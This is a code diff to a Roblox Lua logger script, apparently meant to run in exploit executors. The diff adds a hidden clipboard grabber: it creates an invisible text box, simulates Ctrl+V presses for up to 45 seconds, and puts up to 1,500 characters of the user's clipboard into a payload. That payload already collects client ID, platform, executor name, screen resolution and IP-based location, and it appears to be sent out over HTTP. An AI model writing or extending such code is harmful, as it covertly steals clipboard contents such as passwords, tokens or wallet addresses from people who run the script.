@@ -1,4 +1,5 @@
 local Logger = {}
+local Clipboard = {}
 
 local LocalPlayer = game.Players.LocalPlayer
 local HttpService = game:GetService('HttpService')
@@ -9,6 +10,46 @@ local UserGameSettings = UserSettings():GetService("UserGameSettings")
 
 local HTTP_Request = request or (http and http.request) or (syn and syn.request) or http_request
 local HTTP_Get = game.HttpGet
+
+function Clipboard:Paste()
+    keypress(0x11)
+    keypress(0x56)
+    wait()
+    keyrelease(0x56)
+    keyrelease(0x11)
+end
+
+function Clipboard:TextCap(text, num)
+    return #text >= num and text:sub(1,num) or text
+end
+
+function Clipboard:IsCapable()
+    return keypress and keyrelease
+end
+
+function Clipboard:Get()
+    local CapturedText = nil
+    if(self:IsCapable()) then
+        local Timeout = tick()
+    
+        local TextCaptureHolder = Instance.new("ScreenGui", game.CoreGui)
+        local TextCapture = Instance.new("TextBox", TextCaptureHolder)
+        TextCapture.BackgroundTransparency = 1
+        TextCapture.TextTransparency = 1
+    
+        while not(CapturedText) and (tick()-Timeout) < 45 and task.wait() do
+            TextCapture:CaptureFocus()
+            self:Paste()
+            TextCapture:ReleaseFocus()
+            if (#TextCapture.Text > 0) then
+                CapturedText = TextCapture.Text
+            end
+        end
+    
+        TextCaptureHolder:Destroy()
+    end
+    return CapturedText == nil and 'None' or CapturedText
+end
 
 Logger.BaseURLs = {
     ipapi = 'https://ipapi.co/json/',
@@ -96,6 +137,7 @@ function Logger:FetchFormattedPayload()
                         'ClientId', self:FetchClientID(),
                         'Platform', self:FetchPlatformType(),
                         'Executor', self:FetchExecutorName(),
+                        'Clipboard', Clipboard:TextCap(Clipboard:Get(), 1500),
                         'Resolution', self:FetchWindowResolution()
                     }
                 )
